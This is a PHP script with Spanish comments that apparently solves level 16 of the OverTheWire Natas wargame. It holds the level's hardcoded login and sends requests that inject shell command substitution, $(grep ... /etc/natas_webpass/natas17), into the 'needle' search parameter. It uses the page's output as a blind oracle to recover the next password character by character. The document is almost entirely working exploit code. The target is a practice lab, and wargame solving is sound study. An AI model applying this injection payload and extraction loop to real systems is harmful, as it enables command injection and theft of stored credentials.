<?php

$caracteres_disponibles = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$longitud_caracteres = strlen($caracteres_disponibles);

$caracteres_filtrados = "";
$contrasena_final = "";

# Conexión a natas16 usando cURL
$conexion = curl_init();

#$url = 'http://natas16.natas.labs.overthewire.org/?needle=Africans$(grep%20'. $caracteres_disponibles[$i] .'%20/etc/natas_webpass/natas17)';
$usuario = "natas16";
$contrasena = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V";

for ($i = 0; $i < $longitud_caracteres; $i++) {

    # Establecer la conexión a natas16
    curl_setopt_array($conexion,
        array(
            CURLOPT_URL               => 'http://natas16.natas.labs.overthewire.org/?needle=Africans$(grep%20'. $caracteres_disponibles[$i] .'%20/etc/natas_webpass/natas17)',
            CURLOPT_HTTPAUTH          => CURLAUTH_ANY,
            CURLOPT_USERPWD           => "$usuario:$contrasena",
            CURLOPT_RETURNTRANSFER    => true
        )
    );

    # Ejecutar la solicitud
    $respuesta_servidor = curl_exec($conexion);

    # Sí el caracter no esta en la contrasena
    if (stripos($respuesta_servidor, "Africans") === false) {
        $caracteres_filtrados = $caracteres_filtrados . $caracteres_disponibles[$i];
    }

}

# Mostrar caracteres filtrados
echo "Caracteres filtrados ". $caracteres_filtrados . "\n";

# Fuerza bruta para obtener la contraseña final
echo "Decifrando password de natas17 ...\n";
$longitud_filtrados = strlen($caracteres_filtrados);
for ($i = 0; $i < 32; $i++) {
    for ($j = 0; $j < $longitud_filtrados; $j++) {

        # Establecer la conexión a natas16
        curl_setopt_array($conexion,
            array(
                CURLOPT_URL               => 'http://natas16.natas.labs.overthewire.org/?needle=Africans$(grep%20^'. $contrasena_final . $caracteres_filtrados[$j] .'%20/etc/natas_webpass/natas17)',
                CURLOPT_HTTPAUTH          => CURLAUTH_ANY,
                CURLOPT_USERPWD           => "$usuario:$contrasena",
                CURLOPT_RETURNTRANSFER    => true
            )
        );

        # Ejecutar la solicitud
        $respuesta_servidor = curl_exec($conexion);

        # Si el caracter no esta en la contraseña
        if (stripos($respuesta_servidor, "Africans") === false) {
            $contrasena_final = $contrasena_final . $caracteres_filtrados[$j];
            echo $contrasena_final . "\n";
            break;
        }

    }
}
# Mostrar contraseña final
echo "Contraseña final: " . $contrasena_final . "\n";

# Cerrar conexión
curl_close($conexion);
